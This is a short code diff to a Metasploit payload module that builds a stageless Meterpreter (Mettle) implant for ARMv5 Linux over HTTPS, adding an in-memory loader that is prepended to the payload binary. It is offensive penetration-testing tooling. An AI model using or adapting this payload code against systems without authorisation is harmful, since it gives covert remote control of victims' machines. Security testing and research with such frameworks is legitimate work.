@@ -7,9 +7,11 @@
 module MetasploitModule
   CachedSize = 1106844
 
+
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
+  include Msf::Payload::Linux::Armle::MeterpreterLoader
 
   def initialize(info = {})
     super(
@@ -31,11 +33,12 @@ module MetasploitModule
     )
   end
 
-  def generate(_opts = {})
+  def generate
     opts = {
       scheme: 'https',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('armv5l-linux-musleabi', generate_config(opts)).to_binary :exec
+    in_memory_load(payload) + payload
   end
 end
